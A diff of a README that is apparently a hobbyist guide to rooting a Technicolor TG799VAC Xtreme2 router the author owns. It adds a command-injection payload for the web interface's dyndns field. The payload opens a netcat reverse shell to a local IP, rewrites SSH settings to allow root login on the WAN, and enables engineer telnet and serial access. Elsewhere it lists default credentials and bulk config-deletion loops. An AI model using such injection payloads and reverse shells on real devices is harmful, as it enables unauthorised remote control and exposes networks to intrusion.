@@ -1,8 +1,5 @@
 # README
 
-![Screenshot](files/tg799vacv2.gif)
-
-
    Alright guys, i have bricked my old TG799VAC-XTREME when i figured out how to generate the access key so I just got my new TG799 VAC Xtreme2 with version 17.2 Mint, ofc i have hacked this one aswell since i DO not want backdoors in my network..
 
    I have not found any other tutorial how-to hack this version from technicolor in this way I have done it. Someone has to be the first on a new exploit and let everyone know what's really is an open door straight into your network and your digital life. This is    nothing people just should say things like "i do not care" cause this can really be abused if there is some blackhat hacker on the support or if someone just is curios about your life and has enough freetime . With TSHARK or 
@@ -16,6 +13,21 @@
 ![Screenshot](files/wth.png)
 
 # HOWTO GET ROOT ACCESS FROM WEBGUI:
+
+## SHORT VERSION
+
+Please wait 20-30 seconds before you trying to ssh into your router please..
+Default password: root
+Connect to router: 'ssh root@192.168.1.1'
+
+Copy and paste all this stuff in dyndns field in webgui (edit ip): 
+
+::::::;nc 192.168.1.144 1337 -e /bin/sh;rm /etc/dropbear/*;uci delete dropbear.mgmt &> /dev/null;uci delete dropbear.mgmt.PasswordAuth &> /dev/null;uci delete dropbear.mgmt.RootPasswordAuth &> /dev/null;uci delete dropbear.mgmt.Port &> /dev/null ;uci delete dropbear.mgmt.Interfac e&> /dev/null;uci delete dropbear.mgmt.AllowedClientIPs &> /dev/null;uci delete dropbear.mgmt.enable &> /dev/null;uci delete dropbear.mgmt.IdleTimeout &> /dev/null ;uci set dropbear.wan=dropbear;uci set dropbear.wan.PasswordAuth='off';uci set dropbear.wan.RootPasswordAuth='on';uci set dropbear.wan.Port='22';uci set ropbear.wan.Interface='wan';uci set dropbear.wan.AllowedClientIPs='wanip';uci set dropbear.wan.IdleTimeout='3600';uci set dropbear.wan.enable='1';uci set dropbear.lan=dropbear;uci set ropbear.lan.PasswordAuth='on';uci set dropbear.lan.RootPasswordAuth='on';uci set dropbear.lan.Interface='lan';uci set dropbear.lan.enable='1';uci set dropbear.lan.IdleTimeout='3600';uci set dropbear.lan.Port='22';uci set web.uidefault.nsplink='https://www.wuseman.com';uci set system.config.export_plaintext='1';uci set system.config.export_unsigned='1';uci set system.config.import_plaintext='1';uci set system.config.import_unsigned='1';uci set clash.main_config=single_config;uci set clash.main_config.module_path='/usr/lib/lua/clash/modules';uci set clash.main_config.log_level='3';uci set clash.engineer=user;uci set clash.engineer.ssh='1';uci set clash.engineer.telnet='1';uci set clash.engineer.serial='1';uci set clash.engineer.ssh_key='wuseman@thinkpad';uci set web.uidefault.upgradefw_role='admin';/etc/init.d/dropbear restart; uci commit
+
+
+## LONG VERSION:
+
+![Screenshot](files/tg799vacv2.gif)
 
 #### Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port:
 
@@ -228,6 +240,17 @@
     Use wireshark for listen on BOOTP message, when tg799 router reporting BOOTP then run below command: 
     atftp --trace --option "timeout 1" --option "mode octet" --put --local-file tg799bin.firmware.rbi <ip-addr/hostname>
 
+#### Remove all phone settings:
+
+      phonesettings="$(uci show mmpbx|wc -l)";phoneshit="$(uci show mmpbx | cut -d= -f1)";for z in $phoneshit; do uci delete $z &> /dev/null; done ;echo "Removed $phonesettings useless settings for your router"'
+      
+      Removed 777 useless settings for your router' 
+
+
+#### Remove all iptv settings:
+
+     iptv="$(uci show | grep iptv | cut -d= -f1)"; for iptvcrap in $iptv; do uci delete $iptvcrap &> /dev/null; done; uci show |grep iptv; echo "Ups, no settings for iptv has been set"
+
 #### Got stuck with some packages that says error opening terminal? No worries - This is caused cause colors - Run below command to fix the xterm problem:
 
 ![Screenshot](files/install-opkg-packages.gif)
@@ -290,8 +313,6 @@
     sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp
     sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp
 
-
-
 #### For users that miss vpn card in webgui, run below command (if this modal is missing then its under modals dir in this repo)
 
 ![Screenshot](files/vpn-in-webgui.png)
@@ -305,9 +326,6 @@
     option target '/modals/l2tp-ipsec-server-modal.lp'
     list roles 'admin'
     list roles 'engineer'
-
-
-
 
 #### Setup your dns provider from commandline:
 
@@ -686,11 +704,11 @@
 
     uci set tod.global.enabled='0'
 
-##### List installed packages:
+#### List installed packages:
 
     echo $(opkg list_installed | awk '{ print $1 }')
 
-##### List installed packages in a tree:
+#### List installed packages in a tree:
 
     echo $(opkg list_installed | awk '{ print $1 }') | xargs -n 1
 
@@ -937,6 +955,7 @@
     sed -i 's/false/true/g' /www/docroot/*.lp
     sed -i 's/false/true/g' /www/docroot/
     sed -i 's/false/true/g' /www/docroot/ajax/*.lua
+
 
 #### Add admin to everything and remove superuser & telia:
 ##### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )
